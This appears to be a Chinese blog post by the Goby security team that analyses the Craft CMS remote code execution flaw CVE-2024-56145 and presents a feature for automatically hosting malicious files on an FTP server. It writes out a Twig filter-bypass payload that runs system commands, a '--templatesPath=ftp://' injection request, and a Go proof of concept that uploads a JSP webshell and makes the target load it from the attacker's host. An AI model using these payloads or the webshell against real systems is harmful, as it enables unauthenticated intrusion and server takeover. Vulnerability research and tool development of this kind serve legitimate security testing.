### **前言**

在 EXP 能力升级系列的第一期中，我们围绕 Oracle E-Business Suite 的 CVE-2025-61882 漏洞，通过新增HTTP独立服务实例，实现了自定义路径与多用户服务隔离，打通路径适配利用链路。（第一期可戳文末跳转阅读）

在本期内容中，我们将聚焦另一类高频漏洞利用场景——以 Craft CMS 的远程代码执行漏洞 CVE-2024-56145为例，针对在漏洞验证及利用过程中需要依赖FTP服务存放恶意文件实现RCE的漏洞，展示Goby如何详细拆解该漏洞的利用原理并进行 自定义FTP 服务能力升级。

### **CVE-2024-56145 漏洞原理与利用链解析**

Craft CMS 作为一款广泛使用的内容管理系统，其在 PHP 环境下的配置缺陷成为了攻击者突破防线的关键入口。CVE-2024-56145 漏洞的危害等级被评定为 “严重”，核心风险在于无需认证即可实现远程代码执行（RCE），这一漏洞的触发条件依赖于服务器 PHP 配置中是否启用了 `register_argc_argv` 参数。

**漏洞触发的关键前提**

`register_argc_argv` 是 PHP 中的一个环境变量配置项，启用后会将命令行参数分别存入 `$argc`（参数个数）和 `$argv`（参数数组）变量。正常情况下，该配置主要用于命令行脚本开发，但当 Craft CMS 未对这一配置场景下的参数解析逻辑做严格校验时，便为漏洞利用埋下了隐患。在默认 PHP 配置下，攻击者可以通过查询字符串控制 `$_SERVER['argv']` 数组的内容。

**完整利用链拆解**

攻击者利用该漏洞的过程可分为三个核心步骤:

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a473a1bc8310192c05f9227b4f8dd765d2e777706ae9b6c9e5c814013e8847d16a61b8fc2e927d7cdc37f1750ed616888?tmpCode=0385ce1b-c000-4b74-a5ff-fa23d55c0d10)

1. 搭建恶意 FTP 服务器

   攻击者首先需要部署一个远程 FTP 服务器（需要提供认证信息），并在服务器中存放一个特制的恶意 Twig 模板文件。Twig 作为 Craft CMS 默认使用的模板引擎，虽然不能直接执行 PHP 代码，但攻击者可以利用 Twig 的模板注入功能通过内置过滤器和函数间接执行系统命令。由于 Craft CMS 对危险函数进行了过滤，攻击者需要构造特殊的 payload 来绕过安全限制，例如：

   ```
   {{ ['system', 'ls'] | sort('call_user_func') | join('') }}
   ```

   这利用了 `sort` 过滤器会调用比较函数的特性，间接执行 `call_user_func('system', 'id')`。

2. 构造特殊 HTTP 请求

   攻击者向目标 Craft CMS 站点发送 HTTP 请求时，会在 URL 中植入关键参数 `?--templatesPath=ftp://user:pass@server:port/`。这里的核心技巧在于，`--templatesPath` 本是 Craft CMS 命令行模式下用于指定模板路径的参数，但由于 `register_argc_argv` 配置启用且 Craft CMS 未验证运行环境，系统错误地将 HTTP 请求中的这些参数识别为命令行传入的配置项，从而绕过了正常的路径校验逻辑。

3. 模板加载与代码执行

当 Craft CMS 接收到该请求后，会按照"命令行参数"的解析逻辑，将 `--templatesPath` 指向的 FTP 地址作为模板文件的加载来源。系统会自动连接攻击者控制的 FTP 服务器，下载并解析恶意 Twig 模板。由于 FTP 包装器支持 `file_exists()` 检查（这是该漏洞利用选择 FTP 而非 HTTP 包装器的关键原因），能够通过 Craft CMS 的文件存在性验证。最终，特制的 Twig 模板在服务器上被渲染执行，从而实现远程代码执行。

### **从繁琐到高效：Goby 直击FTP依赖型漏洞调试问题**

然而，安全研究人员在编写该类型漏洞的 EXP 时，若通过自行搭建 FTP 服务器实现完整利用链，则需要把预先设置好恶意命令内容的文件放置在FTP目录下，再发送payload进行漏洞利用。

这个时候就会遇到一个问题：若需修改执行的命令，则需要再手动去修改FTP目录下对应的恶意文件内容进行调试，再发送新的payload请求，遇到不同特定场景的漏洞又需要再做出不同的文件配置操作，这无疑是给漏洞研究环节增加了很多繁琐性的工作。

Goby EXP模块针对这一问题进行升级——新增CustomFtpReq方法。安全研究人员只需要关注执行的payload，**CustomFtpReq****方法可以实现自动启动公网自定义FTP服务，并通过****CustomFtpUploadFile函数自动根据****payload创建/修改对应的文件类型及内容到指定目录**，提供了流程效率上的便利。

大致的结构体实现流程如图所示：

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a7a5c135778ee098c87b0e7e2c34ecc470bfe88a699daa074ecbc96561171f8448b0228c1fb089aa8687bedb4088a4154?tmpCode=0385ce1b-c000-4b74-a5ff-fa23d55c0d10)

**CustomFtpReq 结构体参数**

用于启动自定义FTP服务配置

| **参数名**      | **类型** | **默认值** | **说明**                 | **限制和注意事项**                                           |
| --------------- | -------- | ---------- | ------------------------ | ------------------------------------------------------------ |
| **MaxFileSize** | `int64`  | 124KB      | 最大文件大小限制（字节） | - 必须为正数- 小于等于0时自动设置为124KB- 建议根据实际需求设置合理大小 |
| **Timeout**     | `int`    | 60         | 连接超时时间（秒）       | - 必须为正数- 小于等于0时自动设置为60- 仅影响FTP连接超时，不影响服务存活时间 |

**CustomFtpInfo 结构体参数（返回值）**

| **参数名**      | **类型** | **说明**         | **使用场景**            |
| --------------- | -------- | ---------------- | ----------------------- |
| **FtpUrl**      | `string` | 完整的FTP连接URL | 可直接用于FTP客户端连接 |
| **Host**        | `string` | FTP主机地址      | 用于构建自定义URL       |
| **Port**        | `int`    | FTP端口          | 用于构建自定义URL       |
| **MaxFileSize** | `int64`  | 最大文件大小限制 | 验证上传文件大小        |
| **Timeout**     | `int`    | 连接超时时间     | FTP客户端连接超时设置   |
| **ServiceId**   | `string` | 服务ID           | 服务标识和调试          |



**实战 POC 中的用法示例**

```
// 创建自定义FTP服务
req := godclient.CustomFtpReq{
    MaxFileSize: 1024 * 1024, // 1MB 文件大小限制
    Timeout:     30,          // 30秒超时
}

ftpInfo, err := godclient.CreateCustomFtp(req)
if err != nil {
    return "", nil
}

// 上传恶意文件到FTP服务器
maliciousContent := "<%@ page language='java' %><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
filename = "shell.jsp"

err = godclient.CustomFtpUploadFile(ftpInfo, filename, maliciousContent, 10)
if err != nil {
    return "", nil
}

// 构建攻击载荷，使用上传的FTP文件路径
payload := fmt.Sprintf(`http://target.com/path/include.jsp?file=ftp://%s:%d/%s`,
    ftpInfo.Host, ftpInfo.Port, filename)

// 发起攻击请求
cfg := httpclient.NewGetRequestConfig("/vulnerable/endpoint")
cfg.Params.Add("url", payload)
resp, err := jsonvul.DoHttpRequestWithBaseDir(u, cfg)
if err != nil || resp.StatusCode != 200 {
    return "", nil
}
```



### **以CVE-2024-56145 为例的自定义FTP服务实战能力详解**

使用CustomFtpInfo方法后，即可实现自动化FTP服务恶意命令内容搭建与上传流程，仅需两步即可实现完整检测与利用流程：

第一步：启动FTP服务并上传文件

```
        res, err := godclient.CreatCustomFtp(godclient.CustomFtpReq{
			MaxFileSize: 124 * 1024,
			Timeout:     180,
		})
		if err != nil {
			return "", "", nil
		}
		err = godclient.CustomFtpUploadFile(res, "index.twig", payload, 10)
		if err != nil {
			return "", "", nil
		}
```

FTP服务器启动效果，index.twig文件的效果就是输出一个随机字符串

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a27905087190dd0b93240f6e017d6e568f1a9f132d8163af43aacd57e8742a8315ab355d5ab6e4a61849d33546dfd7e43?tmpCode=0385ce1b-c000-4b74-a5ff-fa23d55c0d10)

第二步：通过发送漏洞验证数据包，检查目标服务器的响应是否存在代码执行效果

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a8169d9d9ddf3b83f77a9ac5cc097a3b32e696d4c0abac76c7ee89f9da5b9be62f24a0d53e59d9c97627eb4945ccbb350?tmpCode=0385ce1b-c000-4b74-a5ff-fa23d55c0d10)

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a6d6e809e475597e6f3f5cf8a35878ad9bd704ab51017bffd96e2f50e661a4698c29b26aa6d69a19f1e497e6197e0fa06?tmpCode=0385ce1b-c000-4b74-a5ff-fa23d55c0d10)

**最终的Goby一键验证利用效果如视频所示：**

![img](https://alidocs.dingtalk.com/core/api/resources/img/5eecdaf48460cde5fcdd09c4007e00c7eb066ecdb87b1eae75b8339e1c4c2483f3677ae38e65e2c18d68742cd653602a0d50ecb3f30f832e9293d80e737db4d52fa5e914b7d597972926085452febd72ddb0c85495a340837e6beb538f57bca3?tmpCode=0385ce1b-c000-4b74-a5ff-fa23d55c0d10)



### **总结**

从第一期针对 “路径固定” 问题的 CreateCustomHttp 方法，到本期聚焦 “FTP 服务依赖” 的CustomFtpInfo 方法，Goby EXP 能力升级的核心始终围绕特定场景下的“实战痛点” 展开。在 CVE-2024-56145 的漏洞利用实践中，FTP 服务自定义能力不仅简化了漏洞验证流程，更通过标准化的服务配置，让漏洞研究变得更加高效。

下一期我们将聚焦fake-mysql能力升级，围绕检测利用JDBC连接反序列化等漏洞场景，实现读取客户端文件或执行命令，敬请期待第三期的技术分享吧~

同时也欢迎各位表哥表姐交流在Goby EXP环节遇到的问题，Bot会收集大家的问题建议作为我们下一步升级的方向哦~



**▌参考**

https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms



Goby欢迎表哥/表姐们加入我们的社区大家庭，一起交流技术、生活趣事、奇闻八卦，结交无数白帽好友。

也欢迎投稿到 Goby（Goby 介绍/扫描/口令爆破/漏洞利用/插件开发/ PoC 编写
/ Webshell /漏洞分析 等文章均可），审核通过后可奖励 Goby 标准版license及周边奖励，快来加入微信群体验吧~

- 微信群：公众号发暗号“加群”，加入我们的社区大家庭
- 下载Goby：https://gobysec.net/[#dl](javascript:;)

![图片](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjIiabR1dAPwPUfdMicdAYjpI64IJvW0ibvQHibec1lKpI5j2gBSHics8h2nBF9PRHv3NwauicLyB5lEWfmQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=7)
